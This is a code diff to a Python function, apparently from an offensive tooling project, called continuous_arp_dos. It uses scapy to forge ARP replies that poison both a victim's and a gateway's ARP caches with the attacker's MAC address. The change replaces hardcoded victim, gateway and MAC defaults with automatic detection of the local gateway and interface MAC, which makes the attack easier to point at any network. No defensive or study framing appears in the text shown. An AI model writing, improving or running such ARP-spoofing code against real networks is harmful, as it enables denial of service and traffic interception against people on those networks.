@@ -2,14 +2,19 @@ import time
 import threading
 from scapy.all import send
 from scapy.layers.l2 import ARP
+from core.network_info import get_my_ip, get_my_mac, get_default_gateway
 
 def continuous_arp_dos(
-    victim_ip: str = "192.168.1.194",
-    gateway_ip: str = "192.168.1.1",
-    attacker_mac: str = "88:AE:DD:5D:88:22",
+    victim_ip: str,
+    gateway_ip: str = None,
+    attacker_mac: str = None,
     iface: str = None,
     interval: float = 2.0
 ):
+
+    gateway_ip = gateway_ip or get_default_gateway()
+    attacker_mac = attacker_mac or get_my_mac()
+
     pkt_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac)
     pkt_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac)
 
